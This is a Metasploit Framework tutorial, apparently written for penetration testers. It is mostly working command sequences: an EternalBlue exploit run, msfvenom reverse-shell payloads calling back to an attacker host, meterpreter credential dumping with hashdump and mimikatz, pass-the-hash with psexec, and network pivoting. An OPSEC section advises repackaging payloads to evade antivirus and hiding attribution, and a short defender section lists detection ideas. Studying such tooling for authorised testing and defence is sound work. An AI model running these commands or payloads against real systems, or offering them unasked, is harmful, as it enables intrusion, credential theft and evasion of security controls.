# Metasploit Framework — full tutorial

The world's most-used exploitation framework. 6,000+ exploits, 4,500+ post-modules, 2,000+ aux modules. The de-facto reference implementation of every well-known CVE PoC.

## Install

```terminal
curl -fsSL https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb | sudo bash
# or part of Kali / Parrot
msfconsole
```

First run initializes a PostgreSQL DB; `db_status` confirms.

## Module types

| Type | Path prefix | Purpose |
|------|------------|---------|
| `exploit` | `exploit/<os>/<service>/...` | Get a session |
| `payload` | `payload/<os>/<arch>/...` | What runs on the target |
| `auxiliary` | `auxiliary/scanner/...` | Scanners, brute-force, info |
| `post` | `post/<os>/...` | Post-exploitation against an active session |
| `encoder` | `encoder/...` | Obfuscate payload |
| `evasion` | `evasion/...` | AV-evasive payload generation |
| `nop` | `nop/...` | NOP sled generators |

## Console basics

```
msf6 > search type:exploit name:eternalblue
msf6 > use exploit/windows/smb/ms17_010_eternalblue
msf6 exploit(...) > info
msf6 exploit(...) > options
msf6 exploit(...) > set RHOSTS 10.0.0.5
msf6 exploit(...) > set LHOST 10.0.0.99
msf6 exploit(...) > set PAYLOAD windows/x64/meterpreter/reverse_tcp
msf6 exploit(...) > check
msf6 exploit(...) > run
```

Useful console commands: `back`, `sessions`, `sessions -i 1`, `jobs`, `kill <id>`, `setg <var> <val>` (global), `unset`, `save`, `loadpath`, `reload_lib`, `irb` (Ruby REPL into MSF state).

## Database integration

```
msf6 > db_status
msf6 > workspace -a engagement-2026-04
msf6 > db_nmap -sV -sC -oA scan target.com
msf6 > hosts
msf6 > services
msf6 > vulns
msf6 > creds
msf6 > loot
```

`db_nmap` runs nmap and ingests results — every host / service queryable.

## Sessions & meterpreter

```
meterpreter > sysinfo
meterpreter > getuid
meterpreter > getsystem
meterpreter > hashdump
meterpreter > screenshot
meterpreter > webcam_snap
meterpreter > load kiwi      # in-memory mimikatz
meterpreter > kiwi_cmd "sekurlsa::logonpasswords"
meterpreter > load extapi
meterpreter > clipboard_get_data
meterpreter > portfwd add -l 9000 -p 3389 -r 10.0.0.5
meterpreter > route add 10.0.0.0/24 1
meterpreter > download / upload
meterpreter > shell           # drop to OS shell
meterpreter > migrate <pid>   # move to a stable process
```

## msfvenom — payload builder

```terminal
# Windows reverse meterpreter EXE
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=1.2.3.4 LPORT=4444 -f exe -o pwn.exe

# PowerShell stager one-liner
msfvenom -p windows/x64/meterpreter/reverse_https LHOST=... LPORT=443 -f psh-cmd

# Linux
msfvenom -p linux/x64/shell_reverse_tcp LHOST=... LPORT=4444 -f elf -o pwn

# Python
msfvenom -p python/meterpreter/reverse_tcp LHOST=... LPORT=4444 -f raw -o pwn.py

# Encoding (rare these days; AV signatures don't care)
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=... -e x64/xor -i 5 -f exe -o pwn.exe
```

## Common modules

| Module | Use |
|--------|-----|
| `auxiliary/scanner/smb/smb_login` | SMB password spray |
| `auxiliary/scanner/ssh/ssh_login` | SSH brute |
| `auxiliary/scanner/portscan/tcp` | TCP scan (slow, prefer nmap) |
| `auxiliary/admin/smb/psexec_command` | One-shot psexec command |
| `exploit/multi/handler` | Catch any payload |
| `exploit/windows/smb/psexec` | Pass-the-hash psexec |
| `post/multi/manage/shell_to_meterpreter` | Upgrade shell → meterpreter |
| `post/windows/gather/credentials/...` | Credential harvesters |
| `post/windows/gather/hashdump` | Dump SAM hashes |
| `post/multi/recon/local_exploit_suggester` | LPE recommendations |

## Workflows

### Catching a meterpreter callback

```
msf6 > use exploit/multi/handler
msf6 > set PAYLOAD windows/x64/meterpreter/reverse_https
msf6 > set LHOST 0.0.0.0
msf6 > set LPORT 443
msf6 > set ExitOnSession false
msf6 > exploit -j
```

`-j` runs as a background job so you can do other things.

### Pass-the-hash with psexec

```
msf6 > use exploit/windows/smb/psexec
msf6 > set RHOSTS 10.0.0.5
msf6 > set SMBUser administrator
msf6 > set SMBPass aad3b435...:5e5a04...
msf6 > set PAYLOAD windows/x64/meterpreter/reverse_https
msf6 > run
```

### Pivot through a meterpreter

```
meterpreter > run autoroute -s 10.0.0.0/24
msf6 > use auxiliary/server/socks_proxy
msf6 > run
# Now in Linux: proxychains4 nmap -sT 10.0.0.5
```

## Bad output and fixes

| Symptom | Cause | Fix |
|---------|-------|-----|
| `[-] Exploit failed: NoMethodError` | Module bug or unmet target reqs | Check `info`, `show targets`, set the right target |
| `[-] Handler failed to bind` | Port in use | `netstat -plnt`; kill or change LPORT |
| `[*] Sending stage` then no session | Stage blocked by EDR / AV | Use `staged` vs `stageless`; HTTPS payload; reflective DLL |
| `db_nmap` hangs | DB schema mismatch | `msfdb reinit`; clear and re-init |
| Session dies after migration | Killed parent before stable migration | `migrate -N explorer.exe` (by name) |

## Defender's perspective

- Default meterpreter has known PE strings → AV catches.
- Reverse TCP/HTTP without obfuscation → IDS catches.
- `psexec` / `wmiexec` modules drop predictable service / file names.
- meterpreter migrate / process injection generates Sysmon EID 8 (CreateRemoteThread).

Detection ideas:
- AV signatures on stock msfvenom output.
- Suricata: ET-Open rules cover meterpreter handshake patterns (specific HTTP URI lengths, TLS JA3).
- Sysmon EID 1: child of `services.exe` with random short name → suspect.

## OPSEC

- Stock msfvenom output is detected by every AV — **always** customize: change User-Agent, use HTTPS with cert pinning, encrypt the C2 with custom RC4, or use `unicorn` / `donut` to repackage.
- Better for serious engagements: switch to Sliver / Mythic / Cobalt Strike with malleable profiles.
- Don't run msfconsole from your real IP if the engagement scope cares about attribution.

## Related tools

| Tool | Difference |
|------|-----------|
| **Cobalt Strike** | Commercial, malleable C2 profiles |
| **Sliver** | OSS, modern, malleable, multi-protocol |
| **Mythic** | OSS, agent-agnostic, web UI |
| **PowerSploit / Empire** | PowerShell-focused (mostly retired) |
| **Havoc / Brute Ratel** | Newer commercial / OSS C2s |
